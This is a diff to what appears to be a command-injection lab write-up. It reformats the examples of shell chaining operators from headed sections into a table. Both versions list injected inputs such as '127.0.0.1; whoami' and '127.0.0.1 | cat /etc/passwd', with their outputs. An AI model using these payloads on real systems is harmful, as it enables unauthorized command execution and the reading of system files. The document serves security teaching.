@@ -63,22 +63,11 @@ Note the `uid=33www-datagid=33www-data` line at the bottom -- this is injected o
 
 Using shell command chaining operators:
 
-### Semicolon (;) -- run second command regardless
-```
-127.0.0.1; whoami
-```nOutput appended: `www-data`
-
-### Double ampersand (&&) -- run second command if first succeeds
-```
-127.0.0.1 && id
-```
-Output: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`
-
-### Pipe (|) -- redirect output
-```
-127.0.0.1 | cat /etc/passwd
-```
-Output: Full contents of `/etc/passwd`
+| Operator | Example | Output |
+|----------|---------|--------|
+| Semicolon `;` | `127.0.0.1; whoami` | `www-data` |
+| Double ampersand `&&` | `127.0.0.1 && id` | `uid=33(www-data) gid=33(www-data)` |
+| Pipe `\|` | `127.0.0.1 \| cat /etc/passwd` | Full contents of `/etc/passwd` |
 
 ---
 
